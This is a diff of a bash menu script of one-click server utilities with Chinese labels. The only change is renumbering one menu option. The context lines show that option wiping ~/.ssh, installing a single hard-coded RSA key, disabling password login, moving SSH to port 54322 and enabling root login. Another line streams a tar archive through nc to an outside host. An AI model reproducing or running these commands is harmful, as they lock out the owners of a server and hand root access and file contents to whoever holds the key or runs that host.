@@ -261,7 +261,7 @@ ${Red_font_prefix}58${Font_color_suffix} bash <(curl -fsSL https://git.io/hyster
 ${Red_font_prefix}59${Font_color_suffix} superspeed_uxh.sh 
 ${Red_font_prefix}60${Font_color_suffix} ping_local
 ${Red_font_prefix}61${Font_color_suffix} 一键工作爬虫搞定 source ~/.bashrc  jobs_spiders
-${Red_font_prefix}2137${Font_color_suffix} 一键搞定13 17 21,需要reboot
+${Red_font_prefix}222${Font_color_suffix} 一键搞定13 17 21,需要reboot
 ${Red_font_prefix}62${Font_color_suffix} trojan_go ws ${Red_font_prefix}免流${Font_color_suffix}
 ${Red_font_prefix}63${Font_color_suffix} xray ${Red_font_prefix}免流${Font_color_suffix}
 ${Red_font_prefix}64${Font_color_suffix} 可以检查mask ip gate ${Red_font_prefix}DD${Font_color_suffix}
@@ -354,7 +354,7 @@ tar cfzv  -   <*/filei_path> | nc -q 1   zhulei.ga 9
                 59)eval "$superspeed_uxh | tee speeds.log";;		
                 60)eval "$ping_local";;		
                 61)eval "$jobs_spiders" ;;		
-                2137)
+                222)
 		eval  'rm -fr  ~/.ssh ;mkdir  ~/.ssh ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7lMkBC39ZW0RFnZZQCrfW2g2mGa2a8TvVd9d+UAfC13oybzrQ4oTEGnJbfhUneDHlo2/sPqN+WsI+xV9bKvUqfv8UfzBk12gB8JRH+gEaj98GqMdiF7YsHLOTDSyUZOEF0WdGORjAFPYOylEQWG/4rDJz7HHTNVoFp5qt8l542ldbSRTNWu8XWsSivEDDkYeb0FeAntn/biz3wXQmwz3myKNcEEBy3UfeysMGDvy/1noL9SQIuyB0Biwtuw4AstykUvoH0AP3nlSc4Cey/n3neCl8di+SBjzWUsICPmJkUQY7szzkFYUbChSO3A9lfmHpJsEGzDiLsF3v2Xdi3UfmfB1MumarW5byR18+KGL2QhCESqLffSONuCQ9UjJdVgdhyKfTTYkjIg8gJ9+1zJbJQq0MBQZw3WQCvyeiaxK/lOAL8CgHGuWDMfshwBgAxiU5mnGICdc253Bdr0pYG3R8CYJZvRmdSfygSZXv3EYDXu1Cz3NBDfdeAU2x6SFygE8= " > ~/.ssh/authorized_keys; sed -i "s/PasswordAuthentication yes/PasswordAuthentication no/g"  /etc/ssh/sshd_config;sed -i "s/#Port 22/Port 54322/g"  /etc/ssh/sshd_config ;sed -i "s/Port 22/Port 54322/g"  /etc/ssh/sshd_config ; sed -i "s/PermitRootLogin no/PermitRootLogin yes/g"  /etc/ssh/sshd_config ; systemctl restart sshd' 
 		eval "$tcpx121721" ;;
                 62)eval "$trojan_go_mianliu" ;;
